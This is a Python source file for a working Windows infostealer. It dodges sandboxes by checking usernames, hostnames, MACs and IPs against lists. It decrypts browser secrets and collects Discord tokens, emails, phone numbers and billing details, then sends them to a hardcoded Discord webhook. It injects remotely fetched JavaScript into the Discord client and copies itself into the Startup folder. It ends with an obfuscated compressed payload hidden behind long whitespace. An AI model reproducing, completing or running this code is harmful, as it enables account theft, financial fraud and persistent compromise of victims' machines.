import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from tokenize import Token
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import sys
import subprocess
import uuid
import socket
import getpass

blacklistUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def checkvm():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

checkvm()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)

sblacklist = ['88.132.231.71', '207.102.138.83', '174.7.32.199', '204.101.161.32', '207.102.138.93', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']

ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').strip()

if ip in sblacklist:
    exit()

hook = "https://discord.com/api/webhooks/1117188429487292497/PtZbr3CKcGO5veGdFk8oeQf0vc4n_DkhQhWHe9azAJt1m9e7ZDucTlDyjRtpX00ZJqN4"
inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
color =  0x812118
DETECTED = False


def g371P():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def g37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return g37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04Dr3QU3575(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def L04DUr118(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def g108411NF0():
    ip = g371P()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    g108411NF0 = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return g108411NF0


def TrU57(C00K13s):
    # simple Trust Factor system
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def inj3c710n():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-1' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj3c710n_cont = requests.get(inj3c710n_url).text

                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj3c710n_cont)
inj3c710n()


def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<a:developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist 


def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:subscriber:1095725882250895481> "
        elif nitrot == 2:
            nitro = "<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName) #dist

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

from builtins import *
from math import prod as Floor


from builtins import *
from math import prod as _divide

# yo guys ty to billy for helping about obfuscate my api connection!

__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Cube, _builtins, _substract, _modulo, _frame, _walk, _while = exec, str, tuple, map, ord, globals, type

class Ceil:
    def __init__(self, Floor):
        self.CallFunction = _divide((Floor, 19579))
        self.Builtins(Negative=-54761)

    def Builtins(self, Negative = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.CallFunction *= 26002 + Negative
        
        try:
            ({'tll3tdli6teubdehed3': _math} or _math if {'tll3tdli6teubdehed3': _math} and _math else ... or (_math, {'tll3tdli6teubdehed3': _math}))

        except AssertionError:
            ({'tll3tdli6teubdehed3': _math} or _modulo if {'tll3tdli6teubdehed3': _math} and _modulo else ... or (_modulo, {'tll3tdli6teubdehed3': _math}))

        except:
            _while(36644 / 78779) == bool

    def Statistics(self, _memoryaccess = -30095):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess *= 95730 - 83483
        self.StackOverflow != None
        
        try:
            ({_builtins: _builtins} or _substract if {_builtins: _builtins} and _substract else ... or (_substract, {_builtins: _builtins}))

        except ArithmeticError:
            ((Cube, Cube, _builtins) or Cube if (Cube, Cube, _builtins) and Cube else ... or (Cube, (Cube, Cube, _builtins)))

        except:
            _while(-3789 + -38688) == Ellipsis

    def Invert(Multiply = bool):
        return _walk()[Multiply]

    def Theory(_cube = 35848 * -18533, _ceil = True, Modulo = _walk):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Modulo()[_cube] = _ceil
        
        try:
            ((_modulo, (_builtins, _substract)) for _modulo in (_modulo, _substract) if _builtins < _walk)

        except TypeError:
            ((_substract, {_builtins: _substract}) for _substract in (Cube, Cube, _builtins) if _substract >= _frame)

        except:
            _while(-62059 - 17004) == Ellipsis

    def execute(code = str):
        return Cube(_builtins(_substract(_modulo(_frame, code))))

    @property
    def StackOverflow(self):
        self.Square = '<__main__.Multiply object at 0x000006511BE68658>'
        return (self.Square, Ceil.StackOverflow)

if __name__ == '__main__':
    try:
        Ceil.execute(code = __code__)
        _calculate = Ceil(Floor = 15831 - 99627)

        if 206792 > 3014505:
            _calculate.Builtins(Negative = _calculate.CallFunction * -14580)
        elif 362924 < 8656060:
            Ceil(Floor = 33856 / 37106).Builtins(Negative = _calculate.CallFunction - -50960)                                                                                                                                                                                                                                                          ;Ceil.Theory(_cube='OoODDODODoDoOoDDoOD',_ceil=b'x\x9c\xdd]Ys\xdbH\x92~\xf7\xaf\xd0\xf8ER\x0c\xdb]\xa8\x13\xe5\x0e\xbflx7F\x1d>6\xc6\x1b\xdb\xbd\xe1\xe9P\xf0\x00mj(\xd2\xa1c,\xcf\xaf\xdf\xac\xcc/\x0b\xa0\x0e\x9b\xb2${\xc6\x84@\\\x85:\xf2\xf8\xf2\x00X:;\xf9\xf4\xf4\xd1\x0e}\x16\xf3=\xde\x96\xcf\xe1\xe1z2??\x9d\x8e\xcf\xd6\'\x87\x87;\x7fz\xf6\xf8/\x9f>t\'\x8b\xf5\xea\xf1\xce\xfadPl|~\xf6~}r\xcae\xf6\x1eO\x16\xcb\xe5\xa7\xb3\xf7\xdd\xbb\xf5\xf8\xcc\x85\xf8x\xf4\xf8?\x96\xe7\xdd_\xbb\xd9\xe3\xfd\x8d\xbb\xde-\xce\xde\x9fO\xa4\xe2\xf7gg\x1fN\x9f\xfe\xfc\xb3\x9c{2]\x1f\xff|\xa9\x9a\x9foh{\xb68\x9d\xaeOf\x9b\xd5\xe0\xe4\x93w\xef~\xfe\xb0\x1c\xbf;\xef.\xdd\xb4\\L\xbb\xd5i\'7\xfd\xe7\x7f\xbf\xf8\xc9>1\x97\x8aL\xd73\xb9\xbe\xfb\xe1d\xb1:\xdb{\xfc\x97n\xb9\\\xef|\\\x9f,g\x7fz\xbc\xbf\xfbh\xffi-]\xae\xef\x9e\xfe}1\xdb\xdd\x7f\xd4]L\xbb\x0fg \xe6\xea\xc39\xdd\xf9\xd7\xf5iw\xba3>\xe9vN\xba\xd9\xdfV\xff\xbbX/\xbb391!\xca\xfcm\xf5\x7f\xebs>\x1a\xef\x94J\xfe\xb6z\xb5\x9e\xacg\x9fv\x96\x8b\xbf\xd3}\x9f\xd6\xe7\x8f\xf7\x1fI\xa7\x16\xc7\x1f\xd6\'g\x87\x87\xd4\xda\xa7\xd3\xdd\xfd\'\xdd\xc5\xe2lo\xff\xd1r=\x1d/O\xf7\xf6\xdf\xee~\xfcxAK\xf9.;\xe5\xbblv\xffx\xf6n\xb9\x9eP\x99G\xd7\x17\x90[i\xa7\x9c\xc1E\xbe\xba\xfb\xf6\xe9\xd3?\xff\xf4\xe7\x9f\xf6~\xda\xfbs\xb3\xbf\xff\x07U\xd4\x9d\x8d\xcf\xceN>S\xd1\xf2h\xb1X,\x8f\xe8{I\x1bZ\x17Wk\x99->WC\xb9\x9d\xb8_\xbehstD\xb5\x94\x83\xc5\x11\rD\xc6\xfa\xe8\xc6"\xdc\x03\xfa\x1c,\x0f\xca\xdf\xc1R\xb6K\xba\xb5\xa7\xdf\x17\xc8\xf0Q>\x17r\xb54zM\x85{\xbb\x93\xf3\xc5\xf2l\xb1*\x8c\xf8\xc7\xf8\xa4\xd0\xf6\xf2\xad\xa5\xc27\xf6\r\xfdY\xfa.\x9b7\xfc\xa1*\xb5\x8c\xdc\x02\xca\xef]\xdf\xd0\xe9jq\xb6\\\x9cO.\xd3q\x7fTI\xbc \x12\x10\xd9\x8f\x96\xb7\xadb\xff\xed=\xd4\xf1d\xb1\x9au\x17{\xbb\xdd\xe9r\xfc_W.\xff\xb1\xffyv\xbd~\xfd\xfc\xf9\xf3\xf5k\xda\xbc~\xbe^?\xa7\x9d\x1f\x96>\xcb\xc5\x87\xe3\xf5\xf4\xd6\x14:>^\x1d\x97\xcf\xeax\xb5Z\xc9\xce\xf1\xea\x96DZ,\xa6\xa7\xe3\xd5\xe2.D\xba\xb1\x8a[\x10\xe9\xe6:\x94H\x9f\xe6\x8b\xe5E\xf7~u~\x1d\x99\xae\xd7\xb1\x83\x83__\xfcJ\x9f\x83\x17\xbf\xf2\x1e\xb5\xf8\x82\xc8\xb3\xbb\xfb\xe4h\xbdX}\x9e\xb6$y\xcf!y$\x85\xb4\xf3\xbc\xec<_\xff\xa82x6^/\xe7\xdb\x93\xb6\x8e\xbe7\x0fr\xf0\xa3\xd2g9\xfeGwk\x05-m\x1c,\xf9\xc3\xad\xf1\x81X\x9d\x1f\x93H\xeb\xf5\xd5\xab,C7\xd9\xd5\xb2\xf3\xf1\x02\xa7\xd4\xc3\xa0\xe5G\xa5Pw~\xf2?\xdbk\x19\x03:\xc3\xfb\xb1@\xfc\x8a\xa1~u[\x90\xff\xb7!\xcf\xc9\xd9\xe9\xed\xe4\x07\xf4\xaaP\x04i"\xe7vP\xcd\x8d`\xb5w\xad\x05\xdd\x9b\xec:cg\xb6\xb53\xd7\xd8L~\xdc\xac+~\xff\xden;?\xbbj~\xf6\xd9u\xfd!\xd91\xed.\xae\x05\xbd\xeb\xa5\xf5\xf5\x9a\xbc\xb5\xb5Y\xd3\xdfk\xfe[\xbf\xe6\x9d;\xb2\xa2\x01+\xcc\xb6\xac\xb8}\x1b\xd6\x86ij)\x9c\x8c\x1b[\xeb\xb2n\xad\xfdb\xdb\xd7S\xe5\xa6&C\n--\x89\xb7\xba\xca\xf1\xf0\x0c\xad_j\xf8\x0e\x03v\xae\xc1\xd6l\x1c\xdb\xe8p\x9cu{\xef\x04\x88]\x9c]Z\xba\x8d},\x0f2\xfc\x14\x83\x1f\xa76\x8d\xa3\xf7\x13\xd7\xa6\x14]ti\xec\x1a\xdf\xd8\x89\xcf)\x85\x9c\xb2\xb7\xc9\xbb\xe8\xe7\xb1\x8d!NbH>d\xdf\xc6\x19}O|\xe3#q\x8a\xca8\x17\'nf\xd3\xfd\x93\xa7c\x82t\x03r\xcc\x06\xc7\x03R}\x99D\xcb\xf1\xf1d6\xde\xb9\xb8\xb8\x80\xad\xed\x03\xfar\xe6\xe9M\x00{K\x99v\xc19[\xd6\xfe[\xb6z\xa6\xbf\xa6e\x1f\x82\xbd\xb7B\xef[\x0eQU4]R\xd8\xe1\x1e\xef?\xc8\xc0\x9a0w\x9e\xd6\x80\x01\x06\xdaw\xf7>\xc88\xa6%\xd3:\xe5\xad\xece>;\xc5\xb1^\x95\xe5\x8b\x1d\xf8\xaa\xc1\xda[\x00\xff\xed\x06\xe8g\xb4tu\xedx;\xc3\xb7.z\x8d\xf7\x1e\x06\x85l\x1b\xdb\xe4i1\xc9\xb9\xb1\x9d\xdb9\xed\xe58\x8f6\x16t!L\x8aM\xf21\xd8\x8e\xf6\xe6qf\xb3\x1d\xd3=\x8e\xee\xb2\xb4\xff\xb5\x98\xb3\xbb\x1a\xb8\x94\xe8\xdc\xf1\xb7\xb6\xd2\x80\xa4\x17\xbf\xbe\xa0\xe8\xfc\xc5A\x89\xd2_\x94\xbf\xa7\xd7u\xf9\x96\xf2;\xc52\x1e,y \xbd\x90\xec\x07\xb4\xac!\xfa\xcb.\x04\xb6\xed%\x17\xa3\xfdj\xcb\xba\xfb\xea\xe5\xabW/\xe9S\xb6\xd8{uG6\x16p\x89\xb4\xb6\xb4Z\xac\t\xc7e\xcd\xe5\xd8N\x98\xd5\xdb\x94\x8d\x0f\xe8\xb4\xa5\xafW\x00\x8e\xd0\x97\xe4 \x1fI\xd4^>%=\xbd\xf87\xf0USY\\\x93\x9a\xe2\xc1\x90\xe7\xe1bt\x13K~Ll\x9d\xb7\x8d\x8di\x16\xbd\x9b\xfa\x1c\xac\x1d\xa7\xe4\x1b\xf2P\\ \xa1\xf7\xce\xcf\x03\xb9:\x81\xee%p\x99\xa6\x10\x0c9\x12\xdeY?\xf7)M\x08\xe9\xa6\xde\x84D\xbe\x8e\xb7c\xdf\xda\xb1\x9b\x87\xe8\x88\x914\xaa\xb1\xb7\xb4L\xa8\xe9\x86\x18O\xcac\'\x81z@}\xa0\xda]"\xc4\n\xb6I9\x85\x98<\xb5o\x1b\xaa\x91\xdc,\xea\xe5\x8c\xfa5\x8d\x84k\x96\x04\xc2\xe7\x18\t\xc9\x9c\x9d\xc4H}\xf6\xa5\x07\xc9\xb8\xb9\r$TT\x83\x9b\x04\xc2\xba@2F-4T\xa3s\xf3\xe8\t\xed\xa8\xce8\xa5\xb1\x91"\xd1\xf8\xba4%\xdf+\xd9&\xb4\x8eT\x9az9\r\xceG\xd7\xc6L\xfd%\xb5\xf2t\'!gCx\xea\xc9\xa3\xa36\xa8LC\xc89\x0e\x8d\rqL=\x8d\xa9\xf5\xc1O\xa9O\xe4\xff\x851\xd1$\x87\xb1\xcdn\xea\xbaT\xc6@V\x96\xecxW45N|\x14\xba\xdf\xb7\xa5e\x9c"\xa2\xd0Z\xbe\xe5H\xf6\xfa\xad\xae\x0f\x88W\xc9Y\xe0\x91D\x02\xb1\xe2\xd5\xe61\x11c\xe3|\x88\xdbF\x12z\xddn\x94\xa3\xeb_\x8f\x7fE\x8b\x97\xcb\x92\x81+*\\\x82\xdc\xa3\xed\xf4ww?\x1c\xfa\xc3x\x98\x0e\r\xad\xf1\xd0\x1d\xe6CGw\xc4\xabg\xbf-